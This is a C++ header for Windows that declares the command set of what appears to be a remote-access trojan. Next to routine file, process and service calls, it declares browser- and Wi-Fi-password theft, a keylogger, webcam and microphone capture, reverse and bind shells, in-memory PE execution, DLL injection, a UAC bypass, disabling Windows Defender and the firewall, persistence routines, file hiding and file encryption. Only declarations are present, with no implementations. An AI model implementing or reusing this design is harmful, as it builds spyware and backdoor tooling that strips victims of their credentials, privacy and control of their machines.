#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <winsock2.h>
#include <windows.h>

#include <string>
#include <vector>

std::string getSysInfoJson();
std::string getProcessListJson();
std::string killProcess(DWORD pid);
std::string listDirectoryJson(const std::string& path);
std::string execCommand(const std::string& cmd);
std::string captureScreenshotBase64();
std::string captureFrameBase64(int quality = 50, int scalePercent = 75);
std::string getNetworkInfoJson();
std::string getInstalledSoftwareJson();
std::string getClipboardText();
std::string setClipboardText(const std::string& text);
std::string getDiskInfoJson();
std::string getStartupProgramsJson();
std::string downloadFile(const std::string& url, const std::string& destPath);
std::string uploadFile(const std::string& srcPath, const std::string& url);
std::string readFileBase64(const std::string& path);
std::string writeFileBase64(const std::string& path, const std::string& base64Data);
std::string deleteFile(const std::string& path);
std::string createDirectory(const std::string& path);
std::string moveFile(const std::string& srcPath, const std::string& dstPath);
std::string copyFile(const std::string& srcPath, const std::string& dstPath);
std::string searchFiles(const std::string& rootPath, const std::string& pattern);
std::string getRecentFilesJson();
std::string getBrowserHistoryJson();
std::string getBrowserPasswordsJson();
std::string getWifiPasswordsJson();
std::string getActiveWindowInfo();
std::string keyloggerStart();
std::string keyloggerStop();
std::string keyloggerGetLogs();
std::string webcamCapture();
std::string audioRecordStart(int durationSec);
std::string audioRecordStop();
std::string getServicesJson();
std::string startService(const std::string& serviceName);
std::string stopService(const std::string& serviceName);
std::string registryRead(const std::string& keyPath, const std::string& valueName);
std::string registryWrite(const std::string& keyPath, const std::string& valueName, const std::string& value);
std::string registryDelete(const std::string& keyPath, const std::string& valueName);
std::string getEnvironmentVarsJson();
std::string setEnvironmentVar(const std::string& name, const std::string& value);
std::string scheduleTask(const std::string& taskName, const std::string& command, const std::string& trigger);
std::string deleteTask(const std::string& taskName);
std::string getTasksJson();
std::string lockWorkstation();
std::string logoffUser();
std::string shutdownSystem(int delay);
std::string rebootSystem(int delay);
std::string getCurrentUserJson();
std::string getUsersJson();
std::string addUser(const std::string& username, const std::string& password);
std::string deleteUser(const std::string& username);
std::string changePassword(const std::string& username, const std::string& newPassword);
std::string getFirewallRulesJson();
std::string addFirewallRule(const std::string& ruleName, const std::string& program, const std::string& action);
std::string deleteFirewallRule(const std::string& ruleName);
std::string disableFirewall();
std::string enableFirewall();
std::string disableWindowsDefender();
std::string enableWindowsDefender();
std::string getAntivirusStatusJson();
std::string getPortsJson();
std::string getConnectionsJson();
std::string reverseShell(const std::string& host, int port);
std::string bindShell(int port);
std::string executeInMemory(const std::string& base64PE);
std::string injectDLL(DWORD pid, const std::string& dllPath);
std::string persistenceAddStartup(const std::string& name, const std::string& path);
std::string persistenceAddService(const std::string& serviceName, const std::string& binaryPath);
std::string persistenceAddScheduledTask(const std::string& taskName, const std::string& command);
std::string elevatePrivileges();
std::string bypassUAC(const std::string& command);
std::string disableTaskManager();
std::string enableTaskManager();
std::string disableRegistryEditor();
std::string enableRegistryEditor();
std::string hideFile(const std::string& path);
std::string unhideFile(const std::string& path);
std::string encryptFile(const std::string& path, const std::string& key);
std::string decryptFile(const std::string& path, const std::string& key);

std::string jsonEscape(const std::string& s);
std::string base64Encode(const std::vector<BYTE>& data);
std::string base64Decode(const std::string& encoded);

